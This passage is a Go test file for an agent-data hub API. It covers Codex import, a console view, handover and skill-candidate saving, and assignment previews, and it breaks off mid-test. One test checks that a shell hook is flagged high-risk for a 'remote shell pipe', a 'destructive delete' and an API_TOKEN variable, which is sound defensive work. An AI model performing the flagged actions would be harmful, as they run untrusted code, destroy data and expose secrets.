package api

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/agi-bar/vola/internal/hubpath"
	"github.com/agi-bar/vola/internal/models"
	"github.com/agi-bar/vola/internal/platforms"
	"github.com/agi-bar/vola/internal/skillsarchive"
	sqlitestorage "github.com/agi-bar/vola/internal/storage/sqlite"
)

func TestSQLiteSharedServerLocalPlatformPreviewCodex(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, _, adminToken, _, _ := newTestHTTPServer(t)
	body, err := json.Marshal(localPlatformDashboardRequest{
		Platform: "codex",
		Mode:     "agent",
	})
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}

	status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/platform/preview", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("preview failed: status=%d env=%+v", status, env)
	}

	var preview platforms.ImportPreview
	if err := json.Unmarshal(env.Data, &preview); err != nil {
		t.Fatalf("Unmarshal preview: %v", err)
	}
	if preview.DisplayName != "Codex CLI" {
		t.Fatalf("unexpected preview: %+v", preview)
	}
	if len(preview.Categories) == 0 {
		t.Fatal("expected preview categories")
	}
	if len(preview.SensitiveFindings) == 0 || len(preview.VaultCandidates) == 0 {
		t.Fatalf("expected codex findings and vault candidates: %+v", preview)
	}
}

func TestSQLiteSharedServerLocalPlatformImportCodex(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	ctx := context.Background()
	user, err := store.EnsureOwner(ctx)
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}

	body, err := json.Marshal(localPlatformDashboardRequest{
		Platform: "codex",
		Mode:     "agent",
	})
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}

	status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/platform/import", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("dashboard import failed: status=%d env=%+v", status, env)
	}

	var resp localPlatformDashboardImportResponse
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		t.Fatalf("Unmarshal response: %v", err)
	}
	if resp.Agent == nil {
		t.Fatalf("expected agent result, got %+v", resp)
	}
	if resp.Agent.ProfileCategories == 0 || resp.Agent.Projects == 0 || resp.Agent.Bundles == 0 || resp.Agent.Conversations == 0 || resp.Agent.SensitiveFindings == 0 || resp.Agent.VaultCandidates == 0 {
		t.Fatalf("expected codex import details in %+v", resp.Agent)
	}

	for _, target := range []string{
		hubpath.ProfilePath("codex-agent"),
		"/projects/vola/context.md",
		"/skills/sample/SKILL.md",
		"/skills/codex-bundled-builtin/SKILL.md",
		codexConversationPath(sqlitestorage.ClaudeConversation{Name: "Plan the import migration.", SessionID: "session-001", StartedAt: "2026-04-16T10:00:00Z"}),
		hubpath.ConversationIndexPath("codex"),
		"/platforms/codex/agent/automations.json",
		"/platforms/codex/agent/tools.json",
		"/platforms/codex/agent/connections.json",
		"/platforms/codex/agent/sensitive-findings.json",
		"/platforms/codex/agent/vault-candidates.json",
	} {
		entry, err := store.Read(ctx, user.ID, target, models.TrustLevelFull)
		if err != nil {
			t.Fatalf("Read(%s): %v", target, err)
		}
		if strings.TrimSpace(entry.Content) == "" && !entry.IsDirectory {
			t.Fatalf("expected content at %s", target)
		}
	}
}

func TestSQLiteSharedServerLocalPlatformImportCodexArchivesLargeProfileRules(t *testing.T) {
	home := createCodexDashboardFixture(t)
	longAgents := "# Large Codex Instructions\n\n" + strings.Repeat("Preserve this imported Codex instruction line for archival import checks.\n", 1200)
	writeClaudeDashboardFixtureFile(t, filepath.Join(home, ".codex", "AGENTS.md"), longAgents)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	ctx := context.Background()
	user, err := store.EnsureOwner(ctx)
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}

	body, err := json.Marshal(localPlatformDashboardRequest{
		Platform: "codex",
		Mode:     "agent",
	})
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}

	status, env := doJSON(t, http.MethodPost, ts.URL+"/api/local/platform/import", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("dashboard import failed: status=%d env=%+v", status, env)
	}

	var resp localPlatformDashboardImportResponse
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		t.Fatalf("Unmarshal response: %v", err)
	}
	if resp.Agent == nil {
		t.Fatalf("expected agent result, got %+v", resp)
	}
	if resp.Agent.ProfileCategories != 1 {
		t.Fatalf("ProfileCategories = %d, want 1 in %+v", resp.Agent.ProfileCategories, resp.Agent)
	}

	profilePath := hubpath.ProfilePath("codex-agent")
	archivePath := "/platforms/codex/agent/profile-rules.md"
	for _, target := range []string{profilePath, archivePath} {
		found := false
		for _, importedPath := range resp.Agent.Paths {
			if importedPath == target {
				found = true
				break
			}
		}
		if !found {
			t.Fatalf("expected path %s in import result paths: %+v", target, resp.Agent.Paths)
		}
	}

	profile, err := store.Read(ctx, user.ID, profilePath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read profile: %v", err)
	}
	if !strings.Contains(profile.Content, "Full archive: `"+archivePath+"`") ||
		!strings.Contains(profile.Content, "Original size:") {
		t.Fatalf("profile summary should point to archived profile rules, got: %s", profile.Content)
	}
	if len(profile.Content) >= localPlatformProfileContentLimitBytes {
		t.Fatalf("profile summary is still too large: %d bytes", len(profile.Content))
	}

	archive, err := store.Read(ctx, user.ID, archivePath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read archived profile rules: %v", err)
	}
	if !strings.Contains(archive.Content, "Large Codex Instructions") ||
		!strings.Contains(archive.Content, "Preserve this imported Codex instruction line") {
		t.Fatalf("archived profile rules did not preserve source content")
	}
	if len(archive.Content) <= localPlatformProfileContentLimitBytes {
		t.Fatalf("archive content should exercise large profile handling, got %d bytes", len(archive.Content))
	}
}

func TestSQLiteSharedServerLocalCodexConsole(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, _, adminToken, _, _ := newTestHTTPServer(t)
	status, env := doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console failed: status=%d env=%+v", status, env)
	}

	var resp codexConsoleResponse
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		t.Fatalf("Unmarshal response: %v", err)
	}
	if resp.Platform != "codex" {
		t.Fatalf("Platform = %q, want codex", resp.Platform)
	}
	if resp.Overview.Threads != 1 || len(resp.Threads) != 1 {
		t.Fatalf("expected one thread, got overview=%+v threads=%+v", resp.Overview, resp.Threads)
	}
	if len(resp.Automations) != 1 || resp.Automations[0].Prompt != "Review the latest imports." {
		t.Fatalf("expected automation prompt, got %+v", resp.Automations)
	}
	hasChronicle := false
	for _, candidate := range resp.MemoryCandidates {
		if candidate.Kind == "chronicle" && candidate.Title == "chronicle/apps/browser" {
			hasChronicle = true
			if candidate.ReviewStatus != "review_required" {
				t.Fatalf("expected default review status, got %+v", candidate)
			}
		}
	}
	if !hasChronicle {
		t.Fatalf("expected chronicle memory candidate, got %+v", resp.MemoryCandidates)
	}
	if len(resp.SensitiveFindings) == 0 || len(resp.VaultCandidates) == 0 {
		t.Fatalf("expected sensitive findings and vault candidates, got %+v %+v", resp.SensitiveFindings, resp.VaultCandidates)
	}
	if len(resp.Runs) != 1 || resp.Runs[0].ToolCalls == 0 || resp.Runs[0].ToolResults == 0 {
		t.Fatalf("expected run timeline, got %+v", resp.Runs)
	}
	foundHandover := false
	for _, handover := range resp.Handovers {
		if handover.Project == "vola" {
			foundHandover = handover.ThreadCount == 1 &&
				handover.RunCount == 1 &&
				len(handover.RecentThreads) > 0 &&
				strings.TrimSpace(handover.Summary) != ""
		}
	}
	if resp.Overview.Handovers == 0 || !foundHandover {
		t.Fatalf("expected vola handover summary, overview=%+v handovers=%+v", resp.Overview, resp.Handovers)
	}
	foundSkillCandidate := false
	for _, candidate := range resp.SkillCandidates {
		if candidate.Project == "vola" && candidate.ThreadID == resp.Threads[0].ID {
			foundSkillCandidate = strings.TrimSpace(candidate.Name) != "" &&
				candidate.ToolCalls > 0 &&
				strings.Contains(candidate.Draft, "## Workflow") &&
				strings.Contains(candidate.Draft, "Source path:")
		}
	}
	if resp.Overview.SkillCandidates == 0 || !foundSkillCandidate {
		t.Fatalf("expected skill candidate, overview=%+v candidates=%+v", resp.Overview, resp.SkillCandidates)
	}
	if resp.Overview.Hooks != 1 || len(resp.Hooks) != 1 || resp.Hooks[0].Status != "manual_required" {
		t.Fatalf("expected hook risk asset, got overview=%+v hooks=%+v", resp.Overview, resp.Hooks)
	}
	hook := resp.Hooks[0]
	if hook.RiskLevel != "high" || hook.Shebang != "#!/bin/sh" {
		t.Fatalf("expected high risk hook analysis, got %+v", hook)
	}
	if !strings.Contains(strings.Join(hook.RiskSignals, ","), "remote shell pipe") ||
		!strings.Contains(strings.Join(hook.RiskSignals, ","), "destructive delete") ||
		!strings.Contains(strings.Join(hook.EnvVars, ","), "API_TOKEN") ||
		!strings.Contains(strings.Join(hook.WritePathHints, ","), "/tmp/codex-hook-cache") {
		t.Fatalf("expected hook review details, got %+v", hook)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleHandoverSave(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	status, env := doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console failed: status=%d env=%+v", status, env)
	}
	var console codexConsoleResponse
	if err := json.Unmarshal(env.Data, &console); err != nil {
		t.Fatalf("Unmarshal console: %v", err)
	}
	var handover codexConsoleHandoverSummary
	for _, item := range console.Handovers {
		if item.Project == "vola" {
			handover = item
			break
		}
	}
	if handover.ID == "" {
		t.Fatalf("expected vola handover in %+v", console.Handovers)
	}

	body, err := json.Marshal(codexConsoleHandoverSaveRequest{ID: handover.ID})
	if err != nil {
		t.Fatalf("Marshal request: %v", err)
	}
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/handovers/save", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("handover save failed: status=%d env=%+v", status, env)
	}
	var saveResp codexConsoleHandoverSaveResponse
	if err := json.Unmarshal(env.Data, &saveResp); err != nil {
		t.Fatalf("Unmarshal save response: %v", err)
	}
	expectedPath := "/projects/vola/handover.md"
	if saveResp.Status != "saved" || saveResp.Project != "vola" || saveResp.Path != expectedPath || saveResp.SavedAt == "" {
		t.Fatalf("unexpected save response: %+v", saveResp)
	}
	if saveResp.Version == 0 || saveResp.Edited {
		t.Fatalf("expected generated handover version without edited flag, got %+v", saveResp)
	}

	ctx := context.Background()
	user, err := store.EnsureOwner(ctx)
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	entry, err := store.Read(ctx, user.ID, expectedPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read saved handover: %v", err)
	}
	for _, expected := range []string{
		"# Codex handover: vola",
		"<!-- codex-console-handover:",
		"## Recent threads",
		"## Recent runs",
		"## Recent artifacts",
		"## Memory candidates",
		"## Manual notes",
	} {
		if !strings.Contains(entry.Content, expected) {
			t.Fatalf("saved handover missing %q:\n%s", expected, entry.Content)
		}
	}
	if len(handover.RecentThreads) > 0 && !strings.Contains(entry.Content, handover.RecentThreads[0].Title) {
		t.Fatalf("saved handover missing recent thread title %q:\n%s", handover.RecentThreads[0].Title, entry.Content)
	}
	if len(handover.MemoryCandidates) > 0 && !strings.Contains(entry.Content, handover.MemoryCandidates[0].Title) {
		t.Fatalf("saved handover missing memory candidate title %q:\n%s", handover.MemoryCandidates[0].Title, entry.Content)
	}

	withManualNote := strings.Replace(entry.Content, "No manual notes yet.", "Keep this human note.", 1)
	if _, err := store.WriteEntry(ctx, user.ID, expectedPath, withManualNote, "text/markdown", models.FileTreeWriteOptions{
		Kind:          "project_handover",
		MinTrustLevel: models.TrustLevelWork,
	}); err != nil {
		t.Fatalf("Write manual handover note: %v", err)
	}
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/handovers/save", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("handover save after manual note failed: status=%d env=%+v", status, env)
	}
	entry, err = store.Read(ctx, user.ID, expectedPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read saved handover after manual note: %v", err)
	}
	if !strings.Contains(entry.Content, "Keep this human note.") {
		t.Fatalf("expected manual note to be preserved:\n%s", entry.Content)
	}
	generatedVersion := entry.Version

	editedContent := "# Edited handover\n\nKeep this edited Agent briefing.\n"
	body, err = json.Marshal(codexConsoleHandoverSaveRequest{
		ID:              handover.ID,
		ContentOverride: editedContent,
	})
	if err != nil {
		t.Fatalf("Marshal edited request: %v", err)
	}
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/handovers/save", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("edited handover save failed: status=%d env=%+v", status, env)
	}
	var editedResp codexConsoleHandoverSaveResponse
	if err := json.Unmarshal(env.Data, &editedResp); err != nil {
		t.Fatalf("Unmarshal edited response: %v", err)
	}
	if editedResp.Status != "saved" || !editedResp.Edited || editedResp.Version <= generatedVersion {
		t.Fatalf("unexpected edited save response: %+v, generated version=%d", editedResp, generatedVersion)
	}
	entry, err = store.Read(ctx, user.ID, expectedPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read edited handover: %v", err)
	}
	if !strings.Contains(entry.Content, "Keep this edited Agent briefing.") ||
		!strings.Contains(entry.Content, codexConsoleHandoverMarker(handover.ID)) {
		t.Fatalf("expected edited content with handover marker:\n%s", entry.Content)
	}

	status, env = doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console after handover save failed: status=%d env=%+v", status, env)
	}
	var afterSave codexConsoleResponse
	if err := json.Unmarshal(env.Data, &afterSave); err != nil {
		t.Fatalf("Unmarshal console after handover save: %v", err)
	}
	foundSaved := false
	for _, item := range afterSave.Handovers {
		if item.ID == handover.ID {
			foundSaved = item.Status == "saved" &&
				item.Path == expectedPath &&
				item.SavedAt != "" &&
				item.Version == entry.Version &&
				strings.Contains(item.SavedContent, "Keep this edited Agent briefing.")
		}
	}
	if !foundSaved {
		t.Fatalf("expected saved handover state in console response: %+v", afterSave.Handovers)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleArtifactRegistrySave(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	status, env := doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console failed: status=%d env=%+v", status, env)
	}
	var console codexConsoleResponse
	if err := json.Unmarshal(env.Data, &console); err != nil {
		t.Fatalf("Unmarshal console: %v", err)
	}
	if len(console.Artifacts) == 0 {
		t.Fatalf("expected artifacts in console response: %+v", console)
	}
	var expectedArtifact codexConsoleArtifact
	for _, artifact := range console.Artifacts {
		if artifact.Name == "docs/import-plan.md" {
			expectedArtifact = artifact
			break
		}
	}
	if expectedArtifact.ID == "" || expectedArtifact.Project != "vola" || expectedArtifact.ThreadID == "" {
		t.Fatalf("expected docs/import-plan.md artifact with project and thread, got %+v", console.Artifacts)
	}
	if expectedArtifact.Role != "handoff-document" ||
		!strings.Contains(expectedArtifact.HandoffNote, "Read this document") ||
		!strings.Contains(expectedArtifact.AgentInstruction, "docs/import-plan.md") {
		t.Fatalf("expected artifact handoff metadata, got %+v", expectedArtifact)
	}

	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/artifacts/save", adminToken, []byte{})
	if status != http.StatusOK || !env.OK {
		t.Fatalf("artifact registry save failed: status=%d env=%+v", status, env)
	}
	var saveResp codexConsoleArtifactRegistrySaveResponse
	if err := json.Unmarshal(env.Data, &saveResp); err != nil {
		t.Fatalf("Unmarshal save response: %v", err)
	}
	if saveResp.Status != "saved" ||
		saveResp.Path != codexConsoleArtifactRegistryPath ||
		saveResp.SavedAt == "" ||
		saveResp.ArtifactCount != len(console.Artifacts) ||
		saveResp.ProjectCount == 0 {
		t.Fatalf("unexpected artifact registry save response: %+v", saveResp)
	}

	ctx := context.Background()
	user, err := store.EnsureOwner(ctx)
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	entry, err := store.Read(ctx, user.ID, codexConsoleArtifactRegistryPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read artifact registry: %v", err)
	}
	var registry codexConsoleSavedArtifactRegistry
	if err := json.Unmarshal([]byte(entry.Content), &registry); err != nil {
		t.Fatalf("Unmarshal artifact registry: %v", err)
	}
	if registry.Version != codexConsoleArtifactRegistryVersion ||
		registry.SourcePlatform != "codex" ||
		registry.ArtifactCount != len(console.Artifacts) ||
		registry.ProjectCount == 0 ||
		len(registry.Artifacts) != len(console.Artifacts) ||
		len(registry.ProjectSummaries) == 0 {
		t.Fatalf("unexpected saved registry: %+v", registry)
	}
	foundProjectSummary := false
	for _, summary := range registry.ProjectSummaries {
		if summary.Project != "vola" {
			continue
		}
		hasRole := false
		for _, role := range summary.Roles {
			if role.Role == "handoff-document" && role.Count > 0 {
				hasRole = true
			}
		}
		hasPrimaryArtifact := false
		for _, artifact := range summary.PrimaryArtifacts {
			if artifact.Name == "docs/import-plan.md" &&
				artifact.Role == "handoff-document" &&
				strings.Contains(artifact.AgentInstruction, "docs/import-plan.md") {
				hasPrimaryArtifact = true
			}
		}
		foundProjectSummary = summary.ArtifactCount > 0 && hasRole && hasPrimaryArtifact
	}
	if !foundProjectSummary {
		t.Fatalf("expected project artifact handoff summary in registry %+v", registry.ProjectSummaries)
	}
	foundArtifact := false
	for _, artifact := range registry.Artifacts {
		if artifact.ID == expectedArtifact.ID {
			foundArtifact = artifact.Name == "docs/import-plan.md" &&
				artifact.Project == "vola" &&
				artifact.ThreadID == expectedArtifact.ThreadID &&
				artifact.SourcePath != "" &&
				artifact.Kind == "file-reference" &&
				artifact.Role == "handoff-document" &&
				strings.Contains(artifact.HandoffNote, "Read this document") &&
				strings.Contains(artifact.AgentInstruction, "Source Codex thread")
		}
	}
	if !foundArtifact {
		t.Fatalf("expected saved artifact %+v in registry %+v", expectedArtifact, registry.Artifacts)
	}

	status, env = doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console after artifact registry save failed: status=%d env=%+v", status, env)
	}
	var afterSave codexConsoleResponse
	if err := json.Unmarshal(env.Data, &afterSave); err != nil {
		t.Fatalf("Unmarshal console after save: %v", err)
	}
	if afterSave.ArtifactRegistry.Status != "saved" ||
		afterSave.ArtifactRegistry.Path != codexConsoleArtifactRegistryPath ||
		afterSave.ArtifactRegistry.SavedAt == "" ||
		afterSave.ArtifactRegistry.ArtifactCount != len(console.Artifacts) ||
		afterSave.ArtifactRegistry.ProjectCount == 0 ||
		len(afterSave.ArtifactRegistry.ProjectSummaries) == 0 {
		t.Fatalf("expected saved artifact registry state, got %+v", afterSave.ArtifactRegistry)
	}
}

func TestSQLiteSharedServerLocalCodexConsoleSkillCandidateSave(t *testing.T) {
	home := createCodexDashboardFixture(t)
	t.Setenv("HOME", home)

	ts, store, adminToken, _, _ := newTestHTTPServer(t)
	status, env := doJSON(t, http.MethodGet, ts.URL+"/api/local/codex-console", adminToken, nil)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("codex console failed: status=%d env=%+v", status, env)
	}
	var console codexConsoleResponse
	if err := json.Unmarshal(env.Data, &console); err != nil {
		t.Fatalf("Unmarshal console: %v", err)
	}
	if len(console.SkillCandidates) == 0 {
		t.Fatal("expected skill candidate")
	}
	candidate := console.SkillCandidates[0]

	body, err := json.Marshal(codexConsoleSkillCandidateSaveRequest{ID: candidate.ID})
	if err != nil {
		t.Fatalf("Marshal request: %v", err)
	}
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/skill-candidates/save", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("skill candidate save failed: status=%d env=%+v", status, env)
	}
	var saveResp codexConsoleSkillCandidateSaveResponse
	if err := json.Unmarshal(env.Data, &saveResp); err != nil {
		t.Fatalf("Unmarshal save response: %v", err)
	}
	if saveResp.Status != "saved" || saveResp.Path == "" || saveResp.MetadataPath == "" || saveResp.ManifestPath == "" {
		t.Fatalf("unexpected save response: %+v", saveResp)
	}
	if !strings.HasPrefix(saveResp.SkillPath, "/skills/_candidates/") {
		t.Fatalf("expected candidate skill path, got %+v", saveResp)
	}

	ctx := context.Background()
	user, err := store.EnsureOwner(ctx)
	if err != nil {
		t.Fatalf("EnsureOwner: %v", err)
	}
	skillEntry, err := store.Read(ctx, user.ID, saveResp.Path, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read saved SKILL.md: %v", err)
	}
	if !strings.Contains(skillEntry.Content, "## Workflow") ||
		!strings.Contains(skillEntry.Content, "Source path:") ||
		!strings.Contains(skillEntry.Content, "when_to_use:") {
		t.Fatalf("unexpected saved skill content:\n%s", skillEntry.Content)
	}

	metadataEntry, err := store.Read(ctx, user.ID, saveResp.MetadataPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read candidate metadata: %v", err)
	}
	var metadata codexConsoleSavedSkillCandidateMetadata
	if err := json.Unmarshal([]byte(metadataEntry.Content), &metadata); err != nil {
		t.Fatalf("Unmarshal metadata: %v", err)
	}
	if metadata.Version != codexConsoleSkillCandidateVersion ||
		metadata.ID != candidate.ID ||
		metadata.Status != "draft" ||
		metadata.Path != saveResp.Path ||
		metadata.SkillPath != saveResp.SkillPath {
		t.Fatalf("unexpected metadata: %+v", metadata)
	}

	manifestEntry, err := store.Read(ctx, user.ID, saveResp.ManifestPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read manifest: %v", err)
	}
	var manifest skillsarchive.SkillManifest
	if err := json.Unmarshal([]byte(manifestEntry.Content), &manifest); err != nil {
		t.Fatalf("Unmarshal manifest: %v", err)
	}
	if manifest.Version != skillsarchive.ManifestVersion ||
		manifest.EntryFile != "SKILL.md" ||
		manifest.SourcePlatform != "codex" ||
		manifest.Summary.Files < 2 {
		t.Fatalf("unexpected manifest: %+v", manifest)
	}

	editedDraft := "# Edited Codex Skill\n\nUse this when a Codex thread has produced a repeatable desktop workflow.\n\n## Workflow\n\n1. Review the user-approved inputs.\n2. Run the desktop verification before saving.\n"
	body, err = json.Marshal(codexConsoleSkillCandidateSaveRequest{
		ID:            candidate.ID,
		Overwrite:     true,
		DraftOverride: editedDraft,
	})
	if err != nil {
		t.Fatalf("Marshal edited request: %v", err)
	}
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/skill-candidates/save", adminToken, body)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("edited skill candidate save failed: status=%d env=%+v", status, env)
	}
	var editedResp codexConsoleSkillCandidateSaveResponse
	if err := json.Unmarshal(env.Data, &editedResp); err != nil {
		t.Fatalf("Unmarshal edited save response: %v", err)
	}
	if editedResp.Status != "saved" || !editedResp.Edited {
		t.Fatalf("expected edited save response, got %+v", editedResp)
	}
	skillEntry, err = store.Read(ctx, user.ID, saveResp.Path, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read edited SKILL.md: %v", err)
	}
	if skillEntry.Content != strings.TrimSpace(editedDraft)+"\n" {
		t.Fatalf("edited SKILL.md mismatch:\n%s", skillEntry.Content)
	}
	metadataEntry, err = store.Read(ctx, user.ID, saveResp.MetadataPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read edited candidate metadata: %v", err)
	}
	if err := json.Unmarshal([]byte(metadataEntry.Content), &metadata); err != nil {
		t.Fatalf("Unmarshal edited metadata: %v", err)
	}
	if !metadata.Edited {
		t.Fatalf("expected edited metadata: %+v", metadata)
	}
	manifestEntry, err = store.Read(ctx, user.ID, saveResp.ManifestPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read edited manifest: %v", err)
	}
	if err := json.Unmarshal([]byte(manifestEntry.Content), &manifest); err != nil {
		t.Fatalf("Unmarshal edited manifest: %v", err)
	}
	editedHash := sha256.Sum256([]byte(strings.TrimSpace(editedDraft) + "\n"))
	foundEditedManifestEntry := false
	for _, file := range manifest.Files {
		if file.Path == "SKILL.md" && file.SHA256 == hex.EncodeToString(editedHash[:]) {
			foundEditedManifestEntry = true
		}
	}
	if !foundEditedManifestEntry {
		t.Fatalf("expected manifest hash for edited SKILL.md: %+v", manifest.Files)
	}

	statusBody, err := json.Marshal(codexConsoleSkillCandidateStatusRequest{
		ID:     candidate.ID,
		Status: "ready",
		Note:   "Reviewed for assignment.",
	})
	if err != nil {
		t.Fatalf("Marshal status request: %v", err)
	}
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/skill-candidates/status", adminToken, statusBody)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("ready skill candidate status failed: status=%d env=%+v", status, env)
	}
	var readyResp codexConsoleSkillCandidateStatusResponse
	if err := json.Unmarshal(env.Data, &readyResp); err != nil {
		t.Fatalf("Unmarshal ready status response: %v", err)
	}
	if readyResp.Status != "ready" ||
		readyResp.SkillPath != saveResp.SkillPath ||
		readyResp.MetadataPath != saveResp.MetadataPath ||
		readyResp.ManifestPath != saveResp.ManifestPath ||
		readyResp.StatusUpdatedAt == "" {
		t.Fatalf("unexpected ready status response: %+v", readyResp)
	}
	metadataEntry, err = store.Read(ctx, user.ID, saveResp.MetadataPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read ready candidate metadata: %v", err)
	}
	if err := json.Unmarshal([]byte(metadataEntry.Content), &metadata); err != nil {
		t.Fatalf("Unmarshal ready metadata: %v", err)
	}
	if metadata.Status != "ready" || metadata.StatusNote != "Reviewed for assignment." || metadata.StatusUpdatedAt == "" {
		t.Fatalf("expected ready metadata: %+v", metadata)
	}
	manifestEntry, err = store.Read(ctx, user.ID, saveResp.ManifestPath, models.TrustLevelFull)
	if err != nil {
		t.Fatalf("Read ready manifest: %v", err)
	}
	if err := json.Unmarshal([]byte(manifestEntry.Content), &manifest); err != nil {
		t.Fatalf("Unmarshal ready manifest: %v", err)
	}
	readyMetadataHash := sha256.Sum256([]byte(metadataEntry.Content))
	foundReadyMetadataManifestEntry := false
	for _, file := range manifest.Files {
		if file.Path == codexConsoleSkillCandidateMetadataFile && file.SHA256 == hex.EncodeToString(readyMetadataHash[:]) {
			foundReadyMetadataManifestEntry = true
		}
	}
	if !foundReadyMetadataManifestEntry {
		t.Fatalf("expected manifest hash for ready metadata: %+v", manifest.Files)
	}

	codexRoot := t.TempDir()
	claudeRoot := t.TempDir()
	assignBody, err := json.Marshal(codexConsoleSkillCandidateAssignPreviewRequest{
		ID:       candidate.ID,
		AgentIDs: []string{"codex", "claude-code", "cursor", "gemini-cli"},
		TargetRoots: map[string]string{
			"codex":       codexRoot,
			"claude-code": claudeRoot,
		},
	})
	if err != nil {
		t.Fatalf("Marshal assign request: %v", err)
	}
	status, env = doJSON(t, http.MethodPost, ts.URL+"/api/local/codex-console/skill-candidates/assign-preview", adminToken, assignBody)
	if status != http.StatusOK || !env.OK {
		t.Fatalf("assign skill candidate failed: status=%d env=%+v", status, env)
	}
	var assignResp codexConsoleSkillCandidateAssignPreviewResponse
	if err := json.Unmarshal(env.Data, &assignResp); err != nil {
		t.Fatalf("Unmarshal assign response: %v", err)
	}
	if assignResp.Status != "assigned" ||
		assignResp.SkillPath != saveResp.SkillPath ||
		len(assignResp.AgentIDs) != 4 ||
		assignResp.AgentIDs[0] != "claude-code" ||
		assignResp.AgentIDs[1] != "codex" ||
		assignResp.AgentIDs[2] != "cursor" ||
		assignResp.AgentIDs[3] != "gemini-cli" ||
		assignResp.SyncPreview == nil ||
		assignResp.SyncPreview.Applied {
		t.Fatalf("unexpected assign response: %+v", assignResp)
	}
	assignedByAgent := map[string]bool{}
	for _, assignment := range assignResp.Assignments {
		for _, assignedPath := range assignment.SkillPaths {
			if assignedPath == saveResp.SkillPath {
				assignedByAgent[assignment.AgentID] = true
			}
		}
	}
	for _, agentID := range []string{"claude-code", "codex", "cursor", "gemini-cli"} {
		if !assignedByAgent[agentID] {
			t.Fatalf("expected %s assignment for %s: %+v", agentID, saveResp.SkillPath, assignResp.Assignments)
		}
	}
	plansByAgent := map[string]localSkillSyncAgentPlan{}
	for _, plan := range assignResp.SyncPreview.Agents {
		plansByAgent[plan.AgentID] = plan
	}
	if len(plansByAgent) != 4 {
		t.Fatalf("expected four agent sync previews: %+v", assignResp.SyncPreview)
	}
	codexPlan := plansByAgent["codex"]
	if codexPlan.AgentID != "codex" ||
		codexPlan.TargetRoot != codexRoot ||
		codexPlan.Summary.Add == 0 ||
		codexPlan.Summary.Written != 0 {
		t.Fatalf("unexpected codex sync preview: %+v", codexPlan)
	}
	claudePlan := plansByAgent["claude-code"]
	if claudePlan.AgentID != "claude-code" ||
		claudePlan.TargetRoot != claudeRoot ||
		claudePlan.Summary.Add == 0 ||
		claudePlan.Summary.Written != 0 {
		t.Fatalf("unexpected claude sync preview: %+v", claudePlan)
	}
	cursorPlan := plansByAgent["cursor"]
	if cursorPlan.AgentID != "cursor" ||
		cursorPlan.Supported ||
		!cursorPlan.ExportAvailable ||
		cursorPlan.Summary.Export == 0 ||
		cursorPlan.Summary.Written != 0 {
